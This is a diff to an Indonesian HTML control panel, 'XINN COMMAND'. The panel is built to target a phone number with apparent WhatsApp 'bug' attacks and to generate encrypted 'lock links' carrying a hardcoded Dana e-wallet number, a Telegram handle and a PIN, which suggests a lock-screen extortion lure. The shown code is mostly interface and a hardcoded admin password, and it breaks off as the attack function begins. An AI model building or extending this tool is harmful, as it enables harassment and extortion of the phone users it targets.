@@ -29,7 +29,6 @@
             position: relative;
         }
 
-        /* Matrix Background */
         #matrixCanvas {
             position: fixed;
             top: 0; left: 0;
@@ -140,7 +139,7 @@
             display: none;
         }
 
-        /* ===== MAIN PANEL (HIDDEN BY DEFAULT) ===== */
+        /* ===== MAIN PANEL ===== */
         .main-panel {
             display: none;
             max-width: 700px;
@@ -271,7 +270,6 @@
             box-shadow: 0 0 20px rgba(0,255,255,0.3);
         }
 
-        /* ===== BUTTONS ===== */
         .btn {
             width: 100%;
             padding: 14px;
@@ -315,7 +313,6 @@
 
         .btn-logout:hover { background: rgba(0,255,255,0.1); }
 
-        /* ===== LOG TERMINAL ===== */
         .terminal {
             background: #000;
             border: 1px solid #333;
@@ -342,7 +339,6 @@
         .terminal-entry.success { border-left-color: var(--green); color: var(--green); }
         .terminal-entry.info { border-left-color: var(--cyan); color: var(--cyan); }
 
-        /* ===== RESULT BOX ===== */
         .result-box {
             background: #000;
             border: 1px solid var(--cyan);
@@ -374,7 +370,6 @@
 
         .btn-copy:hover { background: rgba(0,255,255,0.1); }
 
-        /* ===== TOAST ===== */
         .toast {
             position: fixed;
             bottom: 30px;
@@ -395,7 +390,6 @@
 
         .toast.show { transform: translateX(-50%) translateY(0); }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
             .login-logo { font-size: 1.8rem; }
             .panel-title { font-size: 1.5rem; }
@@ -406,10 +400,8 @@
 </head>
 <body>
 
-    <!-- Matrix Canvas -->
     <canvas id="matrixCanvas"></canvas>
 
-    <!-- Toast -->
     <div class="toast" id="toast"></div>
 
     <!-- ===== LOGIN PAGE ===== -->
@@ -425,14 +417,12 @@
 
     <!-- ===== MAIN PANEL ===== -->
     <div class="main-panel" id="mainPanel">
-        <!-- HEADER -->
         <div class="panel-header">
             <h1 class="panel-title">XINN COMMAND</h1>
             <p class="panel-subtitle">BY XINN IMUT 😈🌸</p>
             <button class="btn btn-logout" onclick="logout()">🔒 LOGOUT</button>
         </div>
 
-        <!-- ANIME BANNER BERGERAK -->
         <div class="anime-banner">
             <img src="https://images.unsplash.com/photo-1607604276583-eef5d763aa60?w=800&q=80" alt="Anime Banner" id="animeBanner">
             <div class="banner-overlay">
@@ -440,17 +430,14 @@
             </div>
         </div>
 
-        <!-- SECTION: BUG WA + LOCK -->
         <div class="section-card">
             <p class="section-title">🎯 TARGET CONTROL</p>
 
-            <!-- NOMOR TARGET -->
             <div class="input-group">
                 <label>📱 NOMOR TARGET</label>
                 <input type="text" id="targetNumber" placeholder="6281234567890">
             </div>
 
-            <!-- TIPE BUG -->
             <div class="input-group">
                 <label>💥 TIPE BUG / AKSI</label>
                 <select id="bugType">
@@ -462,31 +449,27 @@
                 </select>
             </div>
 
-            <!-- BUTTON EKSEKUSI -->
             <button class="btn btn-execute" onclick="executeBug()">🚀 EKSEKUSI</button>
 
-            <!-- TERMINAL LOG -->
             <div class="terminal" id="terminal"></div>
 
-            <!-- LOCK RESULT -->
             <div class="result-box" id="lockResult">
                 <p class="result-label">🔒 LOCK LINK BERHASIL DIBUAT:</p>
                 <p class="result-link" id="lockLink"></p>
                 <button class="btn btn-copy" onclick="copyLockLink()">📋 COPY LINK</button>
                 <button class="btn btn-copy" onclick="previewLock()" style="margin-top:5px;">👁️ PREVIEW</button>
-                <p style="font-size:0.7rem; color:var(--green); margin-top:10px; text-align:center;">🔒 DATA TERENKRIPSI — Target tidak bisa membaca PIN, Dana, atau Telegram dari URL</p>
+                <p style="font-size:0.7rem; color:var(--green); margin-top:10px; text-align:center;">🔒 DATA TERENKRIPSI</p>
             </div>
         </div>
 
-        <!-- FOOTER -->
         <p style="text-align:center; font-size:0.7rem; color: var(--purple); margin-top:20px; padding-bottom:30px;">
             #XinnIsHere ❤️ | XINN SYSTEM v4.0
         </p>
     </div>
 
     <script>
-        // ========== CONFIG ==========
-        const ADMIN_PASSWORD = "xinn29"; // Ganti password di sini
+        // ===== CONFIG =====
+        const ADMIN_PASSWORD = "XINNIMUT";
         const FIXED_DANA = "083175050030";
         const FIXED_TELE = "@xinn_93";
         const FIXED_LOCK_PIN = "281029";
@@ -494,7 +477,7 @@
         let isLoggedIn = false;
         let generatedLockLink = '';
 
-        // ========== MATRIX BACKGROUND ==========
+        // ===== MATRIX BACKGROUND =====
         const canvas = document.getElementById('matrixCanvas');
         const ctx = canvas.getContext('2d');
         let w = canvas.width = window.innerWidth;
@@ -521,7 +504,7 @@
         setInterval(drawMatrix, 50);
         window.addEventListener('resize', () => { w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; });
 
-        // ========== ANIME BANNER SLIDESHOW ==========
+        // ===== ANIME BANNER SLIDESHOW =====
         const animeImages = [
             'https://images.unsplash.com/photo-1607604276583-eef5d763aa60?w=800&q=80',
             'https://images.unsplash.com/photo-1578632767115-351597cf2477?w=800&q=80',
@@ -531,10 +514,11 @@
         let currentBanner = 0;
         setInterval(() => {
             currentBanner = (currentBanner + 1) % animeImages.length;
-            document.getElementById('animeBanner').src = animeImages[currentBanner];
+            const bannerImg = document.getElementById('animeBanner');
+            if (bannerImg) bannerImg.src = animeImages[currentBanner];
         }, 5000);
 
-        // ========== LOGIN SYSTEM ==========
+        // ===== LOGIN SYSTEM =====
         function checkLogin() {
             const password = document.getElementById('loginPassword').value;
             if (password === ADMIN_PASSWORD) {
@@ -561,12 +545,11 @@
             generatedLockLink = '';
         }
 
-        // Enter key for login
         document.getElementById('loginPassword').addEventListener('keydown', function(e) {
             if (e.key === 'Enter') checkLogin();
         });
 
-        // ========== ENCRYPT / DECRYPT ==========
+        // ===== ENCRYPT =====
         function encryptData(data) {
             const salt = 'XINN_' + Math.random().toString(36).substring(2, 8);
             let encrypted = salt + '::';
@@ -576,4 +559,23 @@
             return btoa(encrypted);
         }
 
-        // ========== BUG WA SIMULATION 
+        // ===== EXECUTE BUG =====
+        function executeBug() {
+            if (!isLoggedIn) return;
+
+            const target = document.getElementById('targetNumber').value.trim();
+            const bugType = document.getElementById('bugType').value;
+
+            if (!target || target.length < 10) {
+                showToast('❌ Masukkan nomor target yang valid!');
+                return;
+            }
+
+            const terminal = document.getElementById('terminal');
+            terminal.classList.add('show');
+            terminal.innerHTML = '';
+            document.getElementById('lockResult').classList.remove('show');
+
+            if (bugType === 'lock') {
+                const rawData = JSON.stringify({
+             
